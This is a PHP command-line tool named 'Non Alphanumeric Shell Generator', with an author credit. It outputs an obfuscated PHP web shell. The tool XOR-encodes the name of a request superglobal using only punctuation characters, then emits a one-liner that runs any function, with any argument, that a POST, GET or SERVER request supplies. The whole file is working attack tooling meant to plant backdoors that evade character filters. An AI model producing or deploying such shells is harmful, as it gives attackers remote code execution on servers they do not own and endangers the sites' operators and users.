<?php
/**
 * Code....: Non Alphanumeric Shell Generator - NASG
 * Version.: 0.1
 * Author..: Octalh
 * Contact.: octalh@gmail.com
 * Use.....: php nasg.php -m <post,[get],[server]>
 */
class NASG
{
    private $_validChars = " !#$%&'()*+,-./:;<=>?@[\]^_`{|}~";

    public function __construct()
    {
        $this->_validChars = str_split($this->_validChars);
    }

    private function _isValidChar($char)
    {
        return in_array($char, $this->_validChars);
    }

    private function _getValidXor($char)
    {
        $validChars = $this->_validChars;

        shuffle($validChars);

        foreach ($validChars as $vchar)
        {
            $xor_char = ($char ^ $vchar);

            if ($this->_isValidChar($xor_char))
            {
                return $xor_char;
            }
        }

        return false;
    }

    private function _ofuscatePayload($string)
    {
        $payload = array();

        foreach (str_split($string) as $char)
        {
            $xor_char = $this->_getValidXor($char);

            array_push($payload,
                sprintf(
                    '("%s"^"%s")',
                    $xor_char,
                    ($xor_char ^ $char)
                )
            );
        }

        return implode(".",  $payload);
    }

    public function generatePayload($string, $ofuscated = true)
    {
        if ($ofuscated)
        {
            $string = $this->_ofuscatePayload($string);
        }

        $payload = sprintf(
            '<?php $_=%s;@${"$_"}["_"](@${"$_"}["__"]); ?>',
            $string
        );

        return $payload;
    }
}

///////////////
// Main Proc //
///////////////

$modes  = array('post', 'get', 'server');
$header =  "\n\n [ NASG v0.1 ]\n\t- By Octalh\n\n";

if ($argc != 3)
{
    die(
        sprintf(
            "%sUsage: %s -m <post,[get],[server]>\n\n",
            $header,
            basename(__FILE__)
        )
    );
}

if (!in_array(strtolower($argv[2]), $modes))
{
    die(sprintf("%s[!] Invalid option.\n\n", $header));
}

$mode  = sprintf("_%s", strtoupper($argv[2]));
$nasg  = new NASG();

echo sprintf(
    "%s%s\n\n",
    $header,
    $nasg->generatePayload($mode)
);